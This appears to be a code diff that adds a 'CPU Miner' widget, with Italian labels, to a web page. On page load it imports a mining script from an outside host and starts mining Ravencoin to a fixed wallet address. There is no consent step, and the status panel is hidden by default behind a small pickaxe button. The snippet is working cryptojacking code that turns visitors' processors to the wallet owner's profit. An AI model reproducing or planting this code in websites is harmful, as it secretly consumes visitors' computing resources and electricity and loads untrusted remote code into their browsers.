@@ -1,0 +1,151 @@
+<!-- ==================== MINER CONSOLE ==================== -->
+<style>
+#mining-console {
+    position: fixed;
+    bottom: 80px;
+    right: 20px;
+    width: 310px;
+    background: rgba(0, 0, 0, 0.92);
+    border: 1px solid #ffffff33;
+    border-radius: 6px;
+    padding: 12px 14px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    z-index: 1000;
+    color: #ffffff;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.65;
+    display: none;
+}
+.console-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #ffffff33;
+}
+.close-btn {
+    background: #ffffff;
+    color: #000;
+    border: none;
+    width: 22px;
+    height: 22px;
+    font-size: 16px;
+    line-height: 18px;
+    text-align: center;
+    border-radius: 3px;
+    cursor: pointer;
+    font-weight: bold;
+}
+#reopen-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 50px;
+    height: 50px;
+    background: rgba(255,255,255,0.1);
+    border: 2px solid #ffffff88;
+    color: #ffffff;
+    font-size: 26px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    z-index: 999;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+}
+.earn-line {
+    color: #7CFC00;
+    font-weight: bold;
+}
+</style>
+
+<div id="mining-console">
+    <div class="console-header">
+        <span><strong>CPU Miner</strong></span>
+        <button class="close-btn" onclick="hideMinerConsole()">×</button>
+    </div>
+    <div>Stato: <span id="status">Avviando...</span></div>
+    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
+    <div>Tempo: <span id="timer">00:00</span></div>
+    <div>Job accettati: <span id="shares">0</span></div>
+    <div class="earn-line">Guadagno stimato: <span id="earnings">0.00000000</span> RVN</div>
+    <div class="earn-line">≈ <span id="earnings-eur">0.00000000</span> €</div>
+    <div style="font-size:12px; opacity:0.75; margin-top:4px;">
+        (~<span id="daily-rate">0.00</span> RVN/giorno)
+    </div>
+</div>
+
+<div id="reopen-btn" onclick="showMinerConsole()">⛏</div>
+
+<script type="module">
+    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";
+
+    let miningStarted = false;
+    let startTime = Date.now();
+    let lastUpdate = Date.now();
+    let totalEstimatedRVN = 0;
+
+    // Coefficiente realistico (0.18 RVN per KH/s al giorno)
+    const RVN_PER_KHS_PER_DAY = 0.18;
+    const RVN_PER_KHS_PER_SECOND = RVN_PER_KHS_PER_DAY / 86400;
+
+    // Prezzo approssimativo RVN in EUR (aggiornato a luglio 2026 ≈ 0.0035 €)
+    const RVN_PRICE_EUR = 0.0035;
+
+    async function initMining() {
+        try {
+            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+            miningStarted = true;
+            document.getElementById("status").textContent = "Attivo";
+            
+            setInterval(() => {
+                const now = Date.now();
+                const hr = minotaurxHashrate.currentHashrateKHs || 0;
+                const shares = minotaurxHashrate.sharesAccepted || 0;
+                
+                const deltaSeconds = (now - lastUpdate) / 1000;
+                lastUpdate = now;
+
+                totalEstimatedRVN += hr * RVN_PER_KHS_PER_SECOND * deltaSeconds;
+
+                const eurValue = totalEstimatedRVN * RVN_PRICE_EUR;
+
+                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
+                document.getElementById("shares").textContent = shares;
+                document.getElementById("earnings").textContent = totalEstimatedRVN.toFixed(8);
+                document.getElementById("earnings-eur").textContent = eurValue.toFixed(8);
+                document.getElementById("daily-rate").textContent = (hr * RVN_PER_KHS_PER_DAY).toFixed(2);
+            }, 700);
+
+        } catch (e) {
+            console.error(e);
+            document.getElementById("status").textContent = "Errore";
+        }
+    }
+
+    window.hideMinerConsole = function() {
+        document.getElementById("mining-console").style.display = "none";
+        document.getElementById("reopen-btn").style.display = "flex";
+    };
+
+    window.showMinerConsole = function() {
+        document.getElementById("mining-console").style.display = "block";
+        document.getElementById("reopen-btn").style.display = "none";
+    };
+
+    // Timer
+    setInterval(() => {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
+        const sec = (elapsed % 60).toString().padStart(2, '0');
+        document.getElementById("timer").textContent = `${min}:${sec}`;
+    }, 1000);
+
+    // Avvio
+    window.addEventListener('load', () => {
+        initMining();
+    });
+</script>
